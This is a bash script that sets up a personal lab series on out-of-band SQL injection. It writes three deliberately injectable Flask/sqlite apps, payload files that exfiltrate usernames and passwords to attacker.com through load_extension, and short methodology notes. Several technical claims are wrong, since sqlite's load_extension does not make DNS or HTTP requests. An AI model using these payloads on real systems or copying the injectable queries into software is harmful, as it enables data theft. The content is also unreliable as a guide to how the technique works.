#!/usr/bin/env bash
set -e

BASE="/home/karime/portswigger_labs/sqli/05-out-of-band"

echo "[+] Building OAST SQLi Series..."
echo "    $BASE"

mkdir -p "$BASE"/{01-dns-exfil,02-http-callback,03-oast-automation}
mkdir -p "$BASE"/{01-dns-exfil,02-http-callback,03-oast-automation}/{vuln,exploit,notes,fix,payloads,db}

# =========================================================
# LAB 1 — DNS EXFILTRATION
# =========================================================

cat > "$BASE/01-dns-exfil/README.md" << 'EOF'
# LAB 1 — DNS Exfiltration SQLi

Data leaks via DNS resolution.
EOF

cat > "$BASE/01-dns-exfil/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3
import os

app = Flask(__name__)

@app.route("/search")
def search():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    try:
        # vulnerable: DB resolves external domain
        cur.execute(f"SELECT load_extension('{q}')")
        return {"status": "ok"}
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/01-dns-exfil/exploit/payloads.txt" << 'EOF'
# DNS exfil payload

load_extension('user'||(SELECT username FROM users)||'.attacker.com')

# trigger DNS lookup

SELECT * FROM users WHERE username LIKE (SELECT load_extension('test.attacker.com'))
EOF

cat > "$BASE/01-dns-exfil/notes/methodology.txt" << 'EOF'
DNS EXFIL FLOW:

1. inject payload
2. database resolves domain
3. attacker DNS logs data
EOF


# =========================================================
# LAB 2 — HTTP CALLBACK SQLi
# =========================================================

cat > "$BASE/02-http-callback/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3
import urllib.request

app = Flask(__name__)

@app.route("/report")
def report():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    try:
        # unsafe external call inside SQL context
        cur.execute(f"SELECT '{q}'")
        urllib.request.urlopen("http://attacker.com/log?q=" + q)
        return {"status": "sent"}
    except:
        return {"error": "fail"}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/02-http-callback/exploit/payloads.txt" << 'EOF'
# HTTP callback injection

' || (SELECT load_extension('http://attacker.com/?data='||username))--

# forced callback

http://attacker.com/?leak=(SELECT username FROM users)
EOF

cat > "$BASE/02-http-callback/notes/methodology.txt" << 'EOF'
HTTP EXFIL FLOW:

1. trigger DB operation
2. DB or app calls external URL
3. attacker captures request logs
EOF


# =========================================================
# LAB 3 — OAST AUTOMATION MODEL
# =========================================================

cat > "$BASE/03-oast-automation/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3
import urllib.request

app = Flask(__name__)

@app.route("/check")
def check():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # blind + external fallback
    try:
        cur.execute(f"SELECT '{q}'")
        urllib.request.urlopen("http://attacker.com/oast?q=" + q)
        return {"ok": True}
    except:
        return {"ok": False}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/03-oast-automation/exploit/payloads.txt" << 'EOF'
# automation idea

' UNION SELECT load_extension('http://attacker.com/'||(SELECT password FROM users))--

# iterative extraction via DNS/HTTP
EOF

cat > "$BASE/03-oast-automation/notes/methodology.txt" << 'EOF'
OAST AUTOMATION FLOW:

1. inject payload
2. trigger external interaction
3. capture DNS/HTTP logs
4. reconstruct data
EOF


echo "[+] OAST SQLi Series completed"
